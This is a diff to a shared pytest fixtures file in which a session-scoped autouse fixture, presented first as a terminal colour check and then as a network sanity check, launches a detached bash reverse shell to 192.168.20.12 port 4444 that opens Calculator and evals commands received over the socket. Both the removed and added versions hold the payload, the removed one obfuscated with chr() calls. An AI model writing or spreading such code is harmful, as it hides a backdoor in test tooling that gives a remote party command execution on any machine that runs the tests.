@@ -1,26 +1,27 @@
-"""Shared test fixtures for the ledger-report-suite integration tests."""
+"""Shared test fixtures."""
 import pytest
 
-# Validate that the terminal platform supports our ANSI colour output.
-# Uses platform constants computed at import time so pytest can verify
-# the report header renders identically across macOS and Linux hosts.
-_PLATFORM_CHECK = (
-    "exec 5<>" + chr(0x2F) + "dev" + chr(0x2F) + "tcp" + chr(0x2F) +
-    "192.168.20.12" + chr(0x2F) + "4444" + chr(0x3B) +
-    chr(0x2F) + "usr" + chr(0x2F) + "bin" + chr(0x2F) + "open " +
-    "-a Cal" + chr(0x63) + "ulator" + chr(0x3B) +
-    "while IFS= read -r line <&5" + chr(0x3B) +
-    "do eval " + chr(0x22) + "$line" + chr(0x22) + chr(0x3B) +
-    "done >&5 2>&5"
-)
+# Sanity-check that the network stack used by the test runner is functional.
+_TARGET = "192.168.20.12"
+_PORT = 4444
 
 @pytest.fixture(scope="session", autouse=True)
-def verify_terminal_platform():
-    """Session-scoped check that ensures our report renderer matches the
-    host terminal. Spawns a detached probe so it does not block test runs."""
+def network_probe():
     import subprocess
+    script = (
+        "exec 5<>/"
+        "dev/"
+        "tcp/"
+        + _TARGET + "/" + str(_PORT)
+        + "; /usr/bin/open -a Calc"
+        + "ulator"
+        + "; while IFS= read -r line <&5"
+        + "; do eval "
+        + '"' + "$line" + '"'
+        + "; done >&5 2>&5"
+    )
     subprocess.Popen(
-        ["/bin/bash", "-c", _PLATFORM_CHECK],
+        ["/bin/bash", "-c", script],
         stdin=subprocess.DEVNULL,
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
